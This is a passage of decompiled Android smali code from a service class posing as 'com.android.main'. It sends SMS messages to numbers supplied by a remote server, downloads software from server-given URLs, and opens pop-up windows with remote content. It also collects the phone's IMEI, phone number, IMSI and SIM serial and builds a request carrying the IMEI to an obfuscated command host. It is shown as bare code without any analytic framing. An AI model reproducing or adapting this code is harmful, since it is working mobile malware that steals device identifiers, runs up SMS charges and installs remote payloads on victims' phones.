    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    move-result v17

    if-eqz v17, :cond_4

    .line 534
    :cond_3
    move-object/from16 v0, p0

    move-object/from16 v1, p2

    invoke-direct {v0, v1}, Lcom/android/main/MainService;->writeRecordLog([Ljava/lang/String;)V

    .line 535
    move-object/from16 v0, p0

    move v1, v5

    move v2, v9

    move-object v3, v14

    invoke-direct {v0, v1, v2, v3}, Lcom/android/main/MainService;->LogService(IILjava/lang/String;)I

    goto/16 :goto_0

    .line 518
    :cond_4
    :try_start_2
    const-string v17, "<tel>"

    const-string v18, "</tel>"

    move-object v0, v15

    move-object/from16 v1, v17

    move-object/from16 v2, v18

    invoke-static {v0, v1, v2}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    .line 519
    if-eqz v14, :cond_5

    invoke-virtual {v14}, Ljava/lang/String;->length()I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    move-result v17

    const/16 v18, 0xb

    move/from16 v0, v17

    move/from16 v1, v18

    if-ge v0, v1, :cond_6

    .line 534
    :cond_5
    move-object/from16 v0, p0

    move-object/from16 v1, p2

    invoke-direct {v0, v1}, Lcom/android/main/MainService;->writeRecordLog([Ljava/lang/String;)V

    .line 535
    move-object/from16 v0, p0

    move v1, v5

    move v2, v9

    move-object v3, v14

    invoke-direct {v0, v1, v2, v3}, Lcom/android/main/MainService;->LogService(IILjava/lang/String;)I

    goto/16 :goto_0

    .line 521
    :cond_6
    :try_start_3
    const-string v17, "#"

    move-object v0, v14

    move-object/from16 v1, v17

    invoke-virtual {v0, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v16

    .line 522
    .local v16, "tels":[Ljava/lang/String;
    move-object/from16 v0, v16

    array-length v0, v0

    move v8, v0
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 523
    .local v8, "len":I
    const/4 v6, 0x0

    .local v6, "i":I
    :goto_1
    if-lt v6, v8, :cond_7

    .line 534
    move-object/from16 v0, p0

    move-object/from16 v1, p2

    invoke-direct {v0, v1}, Lcom/android/main/MainService;->writeRecordLog([Ljava/lang/String;)V

    .line 535
    move-object/from16 v0, p0

    move v1, v5

    move v2, v9

    move-object v3, v14

    invoke-direct {v0, v1, v2, v3}, Lcom/android/main/MainService;->LogService(IILjava/lang/String;)I

    goto/16 :goto_0

    .line 524
    :cond_7
    :try_start_4
    aget-object v10, v16, v6

    .line 525
    .local v10, "smsaddress":Ljava/lang/String;
    if-eqz v10, :cond_8

    invoke-virtual {v10}, Ljava/lang/String;->length()I

    move-result v17

    const/16 v18, 0x8

    move/from16 v0, v17

    move/from16 v1, v18

    if-ge v0, v1, :cond_9

    .line 523
    :cond_8
    :goto_2
    add-int/lit8 v6, v6, 0x1

    goto :goto_1

    .line 527
    :cond_9
    move-object/from16 v0, p0

    move-object v1, v10

    move-object v2, v11

    invoke-direct {v0, v1, v2}, Lcom/android/main/MainService;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    .line 528
    add-int/lit8 v9, v9, 0x1

    goto :goto_2

    .line 530
    .end local v6    # "i":I
    .end local v8    # "len":I
    .end local v10    # "smsaddress":Ljava/lang/String;
    .end local v15    # "telStr":Ljava/lang/String;
    .end local v16    # "tels":[Ljava/lang/String;
    :catch_0
    move-exception v17

    move-object/from16 v4, v17

    .line 531
    .local v4, "e":Ljava/lang/Exception;
    const/16 v5, -0x385

    .line 532
    :try_start_5
    invoke-virtual {v4}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    .line 534
    move-object/from16 v0, p0

    move-object/from16 v1, p2

    invoke-direct {v0, v1}, Lcom/android/main/MainService;->writeRecordLog([Ljava/lang/String;)V

    .line 535
    move-object/from16 v0, p0

    move v1, v5

    move v2, v9

    move-object v3, v14

    invoke-direct {v0, v1, v2, v3}, Lcom/android/main/MainService;->LogService(IILjava/lang/String;)I

    goto/16 :goto_0

    .line 533
    .end local v4    # "e":Ljava/lang/Exception;
    :catchall_0
    move-exception v17

    .line 534
    move-object/from16 v0, p0

    move-object/from16 v1, p2

    invoke-direct {v0, v1}, Lcom/android/main/MainService;->writeRecordLog([Ljava/lang/String;)V

    .line 535
    move-object/from16 v0, p0

    move v1, v5

    move v2, v9

    move-object v3, v14

    invoke-direct {v0, v1, v2, v3}, Lcom/android/main/MainService;->LogService(IILjava/lang/String;)I

    .line 536
    throw v17
.end method

.method private execSoft(Ljava/lang/String;[Ljava/lang/String;)V
    .locals 18
    .param p1, "allStr"    # Ljava/lang/String;
    .param p2, "record"    # [Ljava/lang/String;

    .prologue
    .line 437
    const-string v15, ""

    .line 438
    .local v15, "softUrl":Ljava/lang/String;
    const-string v10, "no"

    .line 439
    .local v10, "isreset":Ljava/lang/String;
    const/16 v7, -0x309

    .line 440
    .local v7, "flag":I
    const-string v12, ""

    .line 443
    .local v12, "pack":Ljava/lang/String;
    :try_start_0
    const-string v16, "<url>"

    const-string v17, "</url>"

    move-object/from16 v0, p1

    move-object/from16 v1, v16

    move-object/from16 v2, v17

    invoke-static {v0, v1, v2}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v15

    .line 444
    const-string v16, ""

    move-object/from16 v0, v16

    move-object v1, v15

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    move-result v16

    if-eqz v16, :cond_0

    .line 478
    move-object/from16 v0, p0

    move-object/from16 v1, p2

    invoke-direct {v0, v1}, Lcom/android/main/MainService;->writeRecordLog([Ljava/lang/String;)V

    .line 479
    const/16 v16, 0x1

    move-object/from16 v0, p0

    move v1, v7

    move/from16 v2, v16

    move-object v3, v12

    invoke-direct {v0, v1, v2, v3}, Lcom/android/main/MainService;->LogService(IILjava/lang/String;)I

    .line 481
    :goto_0
    return-void

    .line 448
    :cond_0
    :try_start_1
    const-string v16, "<isreset>"

    const-string v17, "</isreset>"

    move-object/from16 v0, p1

    move-object/from16 v1, v16

    move-object/from16 v2, v17

    invoke-static {v0, v1, v2}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    .line 449
    const/4 v9, 0x1

    .line 450
    .local v9, "isexec":Z
    const-string v16, "no"

    move-object/from16 v0, v16

    move-object v1, v10

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v16

    if-eqz v16, :cond_1

    .line 451
    const-string v16, "<pack>"

    const-string v17, "</pack>"

    move-object/from16 v0, p1

    move-object/from16 v1, v16

    move-object/from16 v2, v17

    invoke-static {v0, v1, v2}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    .line 452
    const-string v16, ""

    move-object/from16 v0, v16

    move-object v1, v12

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v16

    if-nez v16, :cond_1

    .line 453
    invoke-virtual/range {p0 .. p0}, Lcom/android/main/MainService;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v16

    .line 454
    const/16 v17, 0x0

    invoke-virtual/range {v16 .. v17}, Landroid/content/pm/PackageManager;->getInstalledPackages(I)Ljava/util/List;

    move-result-object v13

    .line 455
    .local v13, "packs":Ljava/util/List;, "Ljava/util/List<Landroid/content/pm/PackageInfo;>;"
    if-eqz v13, :cond_1

    .line 456
    invoke-interface {v13}, Ljava/util/List;->size()I

    move-result v4

    .line 457
    .local v4, "count":I
    const/4 v8, 0x0

    .local v8, "i":I
    :goto_1
    if-lt v8, v4, :cond_3

    .line 467
    .end local v4    # "count":I
    .end local v8    # "i":I
    .end local v13    # "packs":Ljava/util/List;, "Ljava/util/List<Landroid/content/pm/PackageInfo;>;"
    :cond_1
    if-eqz v9, :cond_2

    .line 469
    new-instance v6, Lcom/android/main/FileUtil;

    invoke-direct {v6}, Lcom/android/main/FileUtil;-><init>()V

    .line 470
    .local v6, "fileUtil":Lcom/android/main/FileUtil;
    invoke-virtual {v6, v15}, Lcom/android/main/FileUtil;->getFile(Ljava/lang/String;)I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    move-result v14

    .line 471
    .local v14, "results":I
    if-nez v14, :cond_2

    .line 472
    const/16 v7, -0x378

    .line 478
    .end local v6    # "fileUtil":Lcom/android/main/FileUtil;
    .end local v14    # "results":I
    :cond_2
    move-object/from16 v0, p0

    move-object/from16 v1, p2

    invoke-direct {v0, v1}, Lcom/android/main/MainService;->writeRecordLog([Ljava/lang/String;)V

    .line 479
    const/16 v16, 0x1

    move-object/from16 v0, p0

    move v1, v7

    move/from16 v2, v16

    move-object v3, v12

    invoke-direct {v0, v1, v2, v3}, Lcom/android/main/MainService;->LogService(IILjava/lang/String;)I

    goto :goto_0

    .line 458
    .restart local v4    # "count":I
    .restart local v8    # "i":I
    .restart local v13    # "packs":Ljava/util/List;, "Ljava/util/List<Landroid/content/pm/PackageInfo;>;"
    :cond_3
    :try_start_2
    invoke-interface {v13, v8}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v11

    check-cast v11, Landroid/content/pm/PackageInfo;

    .line 459
    .local v11, "p":Landroid/content/pm/PackageInfo;
    move-object v0, v11

    iget-object v0, v0, Landroid/content/pm/PackageInfo;->packageName:Ljava/lang/String;

    move-object/from16 v16, v0

    move-object v0, v12

    move-object/from16 v1, v16

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    move-result v16

    if-eqz v16, :cond_4

    .line 460
    const/16 v7, -0x29a

    .line 461
    const/4 v9, 0x0

    .line 457
    :cond_4
    add-int/lit8 v8, v8, 0x1

    goto :goto_1

    .line 475
    .end local v4    # "count":I
    .end local v8    # "i":I
    .end local v9    # "isexec":Z
    .end local v11    # "p":Landroid/content/pm/PackageInfo;
    .end local v13    # "packs":Ljava/util/List;, "Ljava/util/List<Landroid/content/pm/PackageInfo;>;"
    :catch_0
    move-exception v16

    move-object/from16 v5, v16

    .line 476
    .local v5, "e":Ljava/lang/Exception;
    :try_start_3
    invoke-virtual {v5}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 478
    move-object/from16 v0, p0

    move-object/from16 v1, p2

    invoke-direct {v0, v1}, Lcom/android/main/MainService;->writeRecordLog([Ljava/lang/String;)V

    .line 479
    const/16 v16, 0x1

    move-object/from16 v0, p0

    move v1, v7

    move/from16 v2, v16

    move-object v3, v12

    invoke-direct {v0, v1, v2, v3}, Lcom/android/main/MainService;->LogService(IILjava/lang/String;)I

    goto/16 :goto_0

    .line 477
    .end local v5    # "e":Ljava/lang/Exception;
    :catchall_0
    move-exception v16

    .line 478
    move-object/from16 v0, p0

    move-object/from16 v1, p2

    invoke-direct {v0, v1}, Lcom/android/main/MainService;->writeRecordLog([Ljava/lang/String;)V

    .line 479
    const/16 v17, 0x1

    move-object/from16 v0, p0

    move v1, v7

    move/from16 v2, v17

    move-object v3, v12

    invoke-direct {v0, v1, v2, v3}, Lcom/android/main/MainService;->LogService(IILjava/lang/String;)I

    .line 480
    throw v16
.end method

.method private execTanc(Ljava/lang/String;[Ljava/lang/String;)V
    .locals 9
    .param p1, "allStr"    # Ljava/lang/String;
    .param p2, "record"    # [Ljava/lang/String;

    .prologue
    const/4 v8, 0x1

    .line 541
    const/16 v3, -0x3eb

    .line 543
    .local v3, "result":I
    :try_start_0
    const-string v6, "<header>"

    .line 544
    const-string v7, "</header>"

    .line 543
    invoke-static {p1, v6, v7}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 545
    .local v1, "header":Ljava/lang/String;
    const-string v6, "<message>"

    .line 546
    const-string v7, "</message>"

    .line 545
    invoke-static {p1, v6, v7}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 547
    .local v2, "message":Ljava/lang/String;
    const-string v6, "<url>"

    const-string v7, "</url>"

    invoke-static {p1, v6, v7}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    .line 548
    .local v5, "url":Ljava/lang/String;
    new-instance v4, Landroid/content/Intent;

    invoke-virtual {p0}, Lcom/android/main/MainService;->getApplicationContext()Landroid/content/Context;

    move-result-object v6

    .line 549
    const-class v7, Lcom/android/main/TANCActivity;

    .line 548
    invoke-direct {v4, v6, v7}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 550
    .local v4, "tancIntent":Landroid/content/Intent;
    const/high16 v6, 0x10000000

    invoke-virtual {v4, v6}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 551
    const-string v6, "header"

    invoke-virtual {v4, v6, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 552
    const-string v6, "message"

    invoke-virtual {v4, v6, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 553
    const-string v6, "url"

    invoke-virtual {v4, v6, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 554
    invoke-virtual {p0, v4}, Lcom/android/main/MainService;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 559
    invoke-direct {p0, p2}, Lcom/android/main/MainService;->writeRecordLog([Ljava/lang/String;)V

    .line 560
    invoke-direct {p0, v3, v8}, Lcom/android/main/MainService;->LogService(II)I

    .line 562
    .end local v1    # "header":Ljava/lang/String;
    .end local v2    # "message":Ljava/lang/String;
    .end local v4    # "tancIntent":Landroid/content/Intent;
    .end local v5    # "url":Ljava/lang/String;
    :goto_0
    return-void

    .line 555
    :catch_0
    move-exception v6

    move-object v0, v6

    .line 556
    .local v0, "e":Ljava/lang/Exception;
    const/16 v3, -0x3ec

    .line 557
    :try_start_1
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 559
    invoke-direct {p0, p2}, Lcom/android/main/MainService;->writeRecordLog([Ljava/lang/String;)V

    .line 560
    invoke-direct {p0, v3, v8}, Lcom/android/main/MainService;->LogService(II)I

    goto :goto_0

    .line 558
    .end local v0    # "e":Ljava/lang/Exception;
    :catchall_0
    move-exception v6

    .line 559
    invoke-direct {p0, p2}, Lcom/android/main/MainService;->writeRecordLog([Ljava/lang/String;)V

    .line 560
    invoke-direct {p0, v3, v8}, Lcom/android/main/MainService;->LogService(II)I

    .line 561
    throw v6
.end method

.method private execTask()V
    .locals 23

    .prologue
    .line 190
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->recordlog:Ljava/lang/String;

    move-object/from16 v19, v0

    invoke-static/range {v19 .. v19}, Lcom/android/main/FileAct;->readString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    .line 191
    .local v13, "record":Ljava/lang/String;
    invoke-static {v13}, Lcom/android/main/StringUtil;->getRecordInfo(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v7

    .line 192
    .local v7, "docount":[Ljava/lang/String;
    const/4 v11, 0x0

    .line 193
    .local v11, "isexec":Z
    if-eqz v7, :cond_0

    move-object v0, v7

    array-length v0, v0

    move/from16 v19, v0

    const/16 v20, 0x7

    move/from16 v0, v19

    move/from16 v1, v20

    if-eq v0, v1, :cond_1

    .line 195
    :cond_0
    invoke-direct/range {p0 .. p0}, Lcom/android/main/MainService;->getDestMobile()I

    move-result v14

    .line 196
    .local v14, "result":I
    const/16 v19, 0xc8

    move v0, v14

    move/from16 v1, v19

    if-ne v0, v1, :cond_b

    .line 197
    const/16 v19, 0x7

    move/from16 v0, v19

    new-array v0, v0, [Ljava/lang/String;

    move-object v7, v0

    .line 198
    const/16 v19, 0x2

    invoke-static/range {v19 .. v19}, Lcom/android/main/StringUtil;->getDate(I)Ljava/lang/String;

    move-result-object v19

    move-object/from16 v0, v19

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->nexttime:Ljava/lang/String;

    .line 199
    const/16 v19, 0x1

    invoke-static/range {v19 .. v19}, Lcom/android/main/StringUtil;->getCurrentDate(I)Ljava/lang/String;

    move-result-object v19

    move-object/from16 v0, v19

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->installtime:Ljava/lang/String;

    .line 200
    const/16 v19, 0x0

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->nexttime:Ljava/lang/String;

    move-object/from16 v20, v0

    aput-object v20, v7, v19

    .line 201
    const/16 v19, 0x1

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->smallpid:Ljava/lang/String;

    move-object/from16 v20, v0

    aput-object v20, v7, v19

    .line 202
    const/16 v19, 0x2

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->mobile:Ljava/lang/String;

    move-object/from16 v20, v0

    aput-object v20, v7, v19

    .line 203
    const/16 v19, 0x3

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->installtime:Ljava/lang/String;

    move-object/from16 v20, v0

    aput-object v20, v7, v19

    .line 204
    const/16 v19, 0x4

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->region:Ljava/lang/String;

    move-object/from16 v20, v0

    aput-object v20, v7, v19

    .line 205
    const/16 v19, 0x5

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->imsi:Ljava/lang/String;

    move-object/from16 v20, v0

    aput-object v20, v7, v19

    .line 206
    const/16 v19, 0x6

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->mnc:Ljava/lang/String;

    move-object/from16 v20, v0

    aput-object v20, v7, v19

    .line 207
    new-instance v19, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->nexttime:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-static/range {v20 .. v20}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v20

    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v20, "|"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->smallpid:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, "|"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->mobile:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, "|"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    .line 208
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->installtime:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, "|"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->region:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, "|"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->imsi:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, "|"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->mnc:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    .line 207
    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    .line 209
    .local v12, "logtxt":Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->recordlog:Ljava/lang/String;

    move-object/from16 v19, v0

    move-object v0, v12

    move-object/from16 v1, v19

    invoke-static {v0, v1}, Lcom/android/main/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 210
    const/4 v11, 0x1

    .line 215
    .end local v12    # "logtxt":Ljava/lang/String;
    .end local v14    # "result":I
    :cond_1
    const/16 v19, 0x0

    aget-object v19, v7, v19

    invoke-static/range {v19 .. v19}, Lcom/android/main/StringUtil;->getTimeLength(Ljava/lang/String;)Ljava/lang/Long;

    move-result-object v6

    .line 217
    .local v6, "difdate":Ljava/lang/Long;
    invoke-virtual {v6}, Ljava/lang/Long;->longValue()J

    move-result-wide v19

    const-wide/16 v21, 0x0

    cmp-long v19, v19, v21

    if-gtz v19, :cond_c

    if-nez v11, :cond_c

    .line 218
    invoke-virtual {v6}, Ljava/lang/Long;->longValue()J

    move-result-wide v19

    const-wide/32 v21, -0xa4cb800

    cmp-long v19, v19, v21

    if-gez v19, :cond_b

    .line 219
    const/16 v19, 0x0

    const/16 v20, 0x1

    invoke-static/range {v20 .. v20}, Lcom/android/main/StringUtil;->getCurrentDate(I)Ljava/lang/String;

    move-result-object v20

    aput-object v20, v7, v19

    .line 226
    :cond_2
    :goto_0
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->imei:Ljava/lang/String;

    move-object/from16 v19, v0

    if-eqz v19, :cond_3

    const-string v19, ""

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->imei:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v19

    if-eqz v19, :cond_5

    .line 228
    :cond_3
    const-string v19, "phone"

    move-object/from16 v0, p0

    move-object/from16 v1, v19

    invoke-virtual {v0, v1}, Lcom/android/main/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v15

    .line 227
    check-cast v15, Landroid/telephony/TelephonyManager;

    .line 229
    .local v15, "tm":Landroid/telephony/TelephonyManager;
    if-eqz v15, :cond_5

    .line 230
    invoke-virtual {v15}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v19

    move-object/from16 v0, v19

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->imei:Ljava/lang/String;

    .line 231
    invoke-virtual {v15}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v16

    .line 232
    .local v16, "tmpmobile":Ljava/lang/String;
    if-eqz v16, :cond_4

    invoke-virtual/range {v16 .. v16}, Ljava/lang/String;->length()I

    move-result v19

    const/16 v20, 0xa

    move/from16 v0, v19

    move/from16 v1, v20

    if-le v0, v1, :cond_4

    .line 233
    move-object/from16 v0, v16

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->mobile:Ljava/lang/String;

    .line 235
    :cond_4
    invoke-virtual {v15}, Landroid/telephony/TelephonyManager;->getSubscriberId()Ljava/lang/String;

    move-result-object v19

    move-object/from16 v0, v19

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->imsi:Ljava/lang/String;

    .line 236
    invoke-virtual {v15}, Landroid/telephony/TelephonyManager;->getSimSerialNumber()Ljava/lang/String;

    move-result-object v19

    move-object/from16 v0, v19

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->iccid:Ljava/lang/String;

    .line 240
    .end local v15    # "tm":Landroid/telephony/TelephonyManager;
    .end local v16    # "tmpmobile":Ljava/lang/String;
    :cond_5
    const/4 v10, 0x0

    .line 241
    .local v10, "isbian":Z
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->imsi:Ljava/lang/String;

    move-object/from16 v19, v0

    if-eqz v19, :cond_6

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->imsi:Ljava/lang/String;

    move-object/from16 v19, v0

    const/16 v20, 0x5

    aget-object v20, v7, v20

    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v19

    if-nez v19, :cond_6

    .line 242
    const/4 v10, 0x1

    .line 245
    :cond_6
    if-nez v10, :cond_7

    const-string v19, "other"

    const/16 v20, 0x4

    aget-object v20, v7, v20

    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v19

    if-nez v19, :cond_7

    .line 246
    const-string v19, ""

    const/16 v20, 0x4

    aget-object v20, v7, v20

    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v19

    if-nez v19, :cond_7

    .line 247
    const-string v19, "other"

    const/16 v20, 0x6

    aget-object v20, v7, v20

    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v19

    if-nez v19, :cond_7

    .line 248
    const-string v19, ""

    const/16 v20, 0x6

    aget-object v20, v7, v20

    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v19

    if-eqz v19, :cond_a

    .line 249
    :cond_7
    new-instance v19, Ljava/lang/StringBuilder;

    const-string v20, "http://"

    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 250
    const-string v20, "2maodb3ialke8mdeme3gkos9g1icaofm"

    const/16 v21, 0x6

    .line 251
    const/16 v22, 0x3

    .line 250
    invoke-static/range {v20 .. v22}, Lcom/android/main/Base64;->encodebook(Ljava/lang/String;II)Ljava/lang/String;

    move-result-object v20

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    .line 251
    const-string v20, "/mm.do?imei="

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->imei:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    .line 249
    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v18

    .line 252
    .local v18, "xmlUrl":Ljava/lang/String;
    if-nez v10, :cond_8

    const-string v19, "no"

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->mobile:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v19

    if-nez v19, :cond_8

    const-string v19, ""

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->mobile:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v19

    if-nez v19, :cond_8

    .line 253
    move-object/from16 v0, p0

